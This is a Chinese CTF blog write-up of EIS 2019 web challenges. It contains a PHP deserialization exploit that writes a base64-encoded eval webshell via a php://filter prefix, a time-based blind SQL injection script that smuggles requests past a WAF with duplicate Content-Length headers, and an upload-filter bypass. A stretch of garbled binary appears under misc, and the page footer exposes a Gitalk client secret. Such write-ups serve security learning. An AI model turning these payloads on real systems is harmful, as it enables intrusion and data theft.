@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>eis2019 | oxcccccc</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="eis2019webezuploadupload: 校验文件头 过滤后缀php 上传php5后缀绕过 ezpop https:&#x2F;&#x2F;www.leavesongs.com&#x2F;PENETRATION&#x2F;php-filter-magic.html  &lt;?php error_reporting(0);  class A{      protected $store;      protected $key">
+<meta property="og:type" content="article">
+<meta property="og:title" content="eis2019">
+<meta property="og:url" content="https://www.ccreater.top/2020/04/20/eis2019/index.html">
+<meta property="og:site_name" content="oxcccccc">
+<meta property="og:description" content="eis2019webezuploadupload: 校验文件头 过滤后缀php 上传php5后缀绕过 ezpop https:&#x2F;&#x2F;www.leavesongs.com&#x2F;PENETRATION&#x2F;php-filter-magic.html  &lt;?php error_reporting(0);  class A{      protected $store;      protected $key">
+<meta property="og:locale" content="zh">
+<meta property="article:published_time" content="2020-04-20T12:49:59.977Z">
+<meta property="article:modified_time" content="2020-04-20T12:50:19.078Z">
+<meta property="article:author" content="ccreater">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="oxcccccc" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">oxcccccc</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://www.ccreater.top"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-eis2019" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/04/20/eis2019/" class="article-date">
+  <time class="dt-published" datetime="2020-04-20T12:49:59.977Z" itemprop="datePublished">2020-04-20</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      eis2019
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="eis2019"><a href="#eis2019" class="headerlink" title="eis2019"></a>eis2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h3><p>upload:</p>
+<p>校验文件头</p>
+<p>过滤后缀php</p>
+<p>上传php5后缀绕过</p>
+<h3 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h3><p> <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a> </p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+
+class A{
+
+    protected $store;
+
+    protected $key;
+
+    protected $expire;
+
+    public function __construct($store, $key = &#39;flysystem&#39;, $expire = null)
+    {
+        $this-&gt;key    = $key;
+        $this-&gt;store  = $store;
+        $this-&gt;expire = $expire;
+    }
+
+    public function cleanContents(array $contents)
+    {
+        $cachedProperties = array_flip([
+            &#39;path&#39;, &#39;dirname&#39;, &#39;basename&#39;, &#39;extension&#39;, &#39;filename&#39;,
+            &#39;size&#39;, &#39;mimetype&#39;, &#39;visibility&#39;, &#39;timestamp&#39;, &#39;type&#39;,
+        ]);
+
+        foreach ($contents as $path =&gt; $object) {
+            if (is_array($object)) {
+                $contents[$path] = array_intersect_key($object, $cachedProperties);
+            }
+        }
+
+        return $contents;
+    }
+
+    public function getForStorage()
+    {
+        $cleaned = $this-&gt;cleanContents($this-&gt;cache);
+
+        return json_encode([$cleaned, $this-&gt;complete]);
+    }
+
+    public function save()
+    {
+        $contents = $this-&gt;getForStorage();
+
+        $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire);
+    }
+
+    public function __destruct()
+    {
+        if (! $this-&gt;autosave) {
+            $this-&gt;save();
+        }
+    }
+}
+
+class B{
+
+    protected function getExpireTime($expire): int
+    {
+        return (int) $expire;
+    }
+
+    public function getCacheKey(string $name): string
+    {
+        return $this-&gt;options[&#39;prefix&#39;] . $name;
+    }
+
+    protected function serialize($data): string
+    {
+        if (is_numeric($data)) {
+            return (string) $data;
+        }
+
+        $serialize = $this-&gt;options[&#39;serialize&#39;];
+
+        return $serialize($data);
+    }
+
+    public function set($name, $value, $expire = null): bool
+    {
+        $this-&gt;writeTimes++;
+
+        if (is_null($expire)) {
+            $expire = $this-&gt;options[&#39;expire&#39;];
+        }
+
+        $expire   = $this-&gt;getExpireTime($expire);
+        $filename = $this-&gt;getCacheKey($name);
+
+        $dir = dirname($filename);
+
+        if (!is_dir($dir)) {
+            try {
+                mkdir($dir, 0755, true);
+            } catch (\Exception $e) {
+                // 创建失败
+            }
+        }
+
+        $data = $this-&gt;serialize($value);
+
+        if ($this-&gt;options[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) {
+            //数据压缩
+            $data = gzcompress($data, 3);
+        }
+
+        $data   = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;
+        $result = file_put_contents($filename, $data);
+
+        if ($result) {
+            return true;
+        }
+
+        return false;
+    }
+
+}
+
+if (isset($_GET[&#39;src&#39;]))
+{
+    highlight_file(__FILE__);
+}
+
+$dir = &quot;uploads/&quot;;
+
+if (!is_dir($dir))
+{
+    mkdir($dir);
+}
+unserialize($_GET[&quot;data&quot;]);</code></pre>
+<p>这里有一个上传点</p>
+<pre><code class="php">$data   = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;
+$result = file_put_contents($filename, $data);</code></pre>
+<p>但是这里有个死亡exit</p>
+<p> <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a> </p>
+<p>这里文件名可控,我们用php协议编码exit从而绕过死亡exit</p>
+<p>构造</p>
+<pre><code class="php">&lt;?php
+
+class A{
+
+    protected $store;
+
+    protected $key;
+
+    protected $expire;
+    public $autosave=FALSE;
+    public $complete;
+    public $cache;
+
+    public function __construct()
+    {
+        $this-&gt;key    = &quot;fffffuck.php&quot;;
+        $this-&gt;store=new B;
+        $this-&gt;expire = $expire;
+        $this-&gt;complete=&quot;PD9waHAgZXZhbCgkX1BPU1RbImEiXSk7ID8+&quot;;
+        $this-&gt;cache=array();
+    }
+
+}
+
+class B{
+
+    public $options;
+    public $writeTimes;
+    public function __construct()
+    {
+        $this-&gt;options=array(
+            &#39;expire&#39;=&gt;&#39;0&#39;,
+            &quot;prefix&quot;=&gt;&#39;php://filter/write=convert.base64-decode/resource=uploads/&#39;,
+            &#39;serialize&#39;=&gt;&#39;serialize&#39;,
+            &#39;data_compress&#39;=&gt;FALSE
+        );
+
+    }
+
+
+}
+print(urlencode(serialize(new A)));
+?&gt;</code></pre>
+<h3 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h3><p> <a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">https://github.com/mm0r1/exploits</a> </p>
+<p>利用这个绕过</p>
+<h3 id="ezwaf"><a href="#ezwaf" class="headerlink" title="ezwaf"></a>ezwaf</h3><pre><code class="php">&lt;?php
+include &quot;config.php&quot;;
+
+if (isset($_GET[&#39;src&#39;]))
+{
+    highlight_file(__FILE__);
+}
+
+function escape($arr)
+{
+    global $mysqli;
+    $newarr = array();
+    foreach($arr as $key=&gt;$val)
+    {
+        if (!is_array($val))
+        {
+            $newarr[$key] = mysqli_real_escape_string($mysqli, $val);
+        }
+    }
+    return $newarr;
+}
+
+$_GET= escape($_GET);
+
+if (isset($_GET[&#39;name&#39;]))
+{
+    $name = $_GET[&#39;name&#39;];
+    mysqli_query($mysqli, &quot;select age from user where name=&#39;$name&#39;&quot;);
+}else if(isset($_GET[&#39;age&#39;]))
+{
+    $age = $_GET[&#39;age&#39;];
+    mysqli_query($mysqli, &quot;select name from user where age=$age&quot;);
+}
+
+</code></pre>
+<p>选择age作为注入点，不需要逃逸引号,没有回显利用时间盲注</p>
+<p><code>?age=1%2bsleep(1)</code> =&gt; 403</p>
+<p>apache设置了waf</p>
+<p>用畸形的http绕过waf</p>
+<pre><code class="python">import requests
+import hackhttp 
+import urllib
+import socket
+
+ip = &#39;111.186.57.61&#39;
+port = 10601
+
+def send_raw(raw):
+
+    try:
+        with socket.create_connection((ip, port), timeout=2) as conn:
+            conn.send(bytes(raw,encoding=&quot;ascii&quot;))
+            res = conn.recv(10240).decode()
+
+    except:
+        return True
+
+    return False
+
+
+
+def rawhttp(sql):
+    sql=urllib.parse.quote(sql)
+    burp0_url = &quot;http://111.186.57.61:10601/?age={}&quot;.format(sql)
+    raw=&#39;&#39;&#39;GET /?age={} HTTP/1.1
+Host: 111.186.57.61:10601
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+Content-Length: 0
+Content-Length: 0
+
+&#39;&#39;&#39;.format(sql).replace(&quot;\n&quot;,&quot;\r\n&quot;)
+    return send_raw(raw)
+
+
+l=&#39;0123456789ABCDEF&#39;
+result=&quot;657A73716C69&quot;#database :ezsqli
+
+result=&quot;&quot;#table flag_xdd,user?
+#column flag_32122
+#flag{bypass_modsecurity_a202e614489c}
+j=len(result)
+while True:
+    for i in l:
+        sql=&quot;if((select substr(hex(GROUP_CONCAT(flag_32122)),{},1) FROM flag_xdd)=char({}),sleep(10),0)&quot;.format(j+1,ord(i))
+        if rawhttp(sql):
+            result+=i
+            print(result)
+            break
+        else :
+            print(&quot;第{}个字符不是{}&quot;.format(j+1,i))
+    j+=1
+
+
+</code></pre>
+<h3 id="ezcms"><a href="#ezcms" class="headerlink" title="ezcms"></a>ezcms</h3><p>莫得</p>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="two-cat"><a href="#two-cat" class="headerlink" title="two_cat"></a>two_cat</h3><p>看别人的wp知道是盲水印攻击</p>
+<h2 id="misc-1"><a href="#misc-1" class="headerlink" title="misc 1"></a>misc 1</h2><pre><code>I¤Ìçz6j|´±¥ó¼¹[ƂĄʃz@ałޢ|ӄɒak@ałޢŅyĉӡk@ałޒ|ӄɒak@֋@JBťɁÉ֕k@ŧÅՄń@Ձ٨@ÖąŀąÉԁԀɕÅكȁՇƀÖąZ@U@SӅǅŀÈYCÅڀĀĢń@֕@ʂՀĉՖęË@ɣ@ŧɢâ@ɕ@c@ӅbĀȀԤäSӨ@ɕÖԗcɂӅ@Ņ٢ɖբk@SԀƅcęɕȀ¤È@ąӉǈâ@b@Ֆ֠ÖգɇĖĢ@Ӆãř@ؤŕÅÀUŀÈƀBՃƀֆ@ŅفԀ¢ĉʀפՃäcɖրÈYCÅ٢@ƁəӨ@ɔז٣UĀƖڀԖąٕ@Öԗģř@ӁՇāǅÀMŧCÓɀƈɃɀÈYCÅ٢@YƀBգ@ŁىŢ@CÖلɕȀÖ@ƈɃɀŅ٢ɖրֆ@ƂĄʃ@ȖŽم@Ӗ֒ɕȀc]K@ʂՀDWÅŀƂĄʃ@ƙ֔@פՃȅŀÁل@Öą@ɕ@ÈƀŁٓɀ񹶰ÀUŀי֔ēǁÅŀɣ@b@ä£֔ř`ÖգٖԀÁãɃ@MƀÖՕŃÖڀÖբ׉فè]k@ęՉՇ@ÈƀSمDɀŢÁɢȅŀ¢ĉʀ£UāلK@㖄hk@ʂՀÓIԢ@Ö@@U@֗ŕ`¨£ŔÀÖԗUɫ@¤ĀʂսÀ֦րąىףɖրֆ@ÈƀƂĄʃ@ŁىUâ@UŀȖǀÖ@ÖեřĀæŅրÈŔ@ɢ@£ɓԀɕÅٕSӨ@ÓbƉń@ÖؠÙţk@¤ٕ`Ɩم`مDɕȋ@ȁÒřÀUÈ@c@ÈƀŅ٨@Ձԅ@ֆ@ƂĄʃ@UŀÖբɄř@ɣ@ԁՉƅ£cɖրֆ@פم£@ťɓKƓG@ɢ@ƓGp°��ƴ����򴄴𰲳ǰƄÅ�</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/04/20/eis2019/">https://www.ccreater.top/2020/04/20/eis2019/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://www.ccreater.top/2020/04/20/eis2019/" data-id="ckmn5dced0045jsnidmoi3ibt" data-title="eis2019" class="article-share-link">Share</a>
+      
+	  
+			  
+				  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+  <script src="/js/md5.min.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '2928409e787d74264ece',
+        clientSecret: '8e2a058971b6fac2da6dd1fb6e8233aaf095a7b5 ',
+        id: md5(window.location.pathname),
+        repo: 'ccreater222.github.io',
+        owner: 'ccreater222',
+        admin: 'ccreater222',
+        distractionFreeMode: 'true'
+    })
+    gitalk.render('gitalk-container')
+</script>
+				
+	  
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/04/20/d3ctf2019/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          d3ctf
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/04/20/nbctf/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">newbie ctf 2019</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/htb/" rel="tag">htb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/LFI/" style="font-size: 10px;">LFI</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 11.67px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 15px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/htb/" style="font-size: 10px;">htb</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 11.67px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 16.67px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 11.67px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/01/14/real%20world%20ctf%202020/">real world ctf 2020</a>
+          </li>
+        
+          <li>
+            <a href="/2020/12/14/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/">2020xnuca_ezwp题解</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/27/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">2020 balsn ctf web 部分题解</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/24/2020%E7%A5%A5%E4%BA%91%E6%9D%AFweb%E9%A2%98%E8%A7%A3/">2020祥云杯web题解</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/13/XNUCA_2020_oooooooldjs%E9%A2%98%E8%A7%A3/">XNUCA_2020_oooooooldjs题解</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 ccreater<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":100},"mobile":{"show":true},"react":{"opacity":0.7},"dialog":{"enable":true,"hitokoto":true},"log":false});</script></body>
+</html>
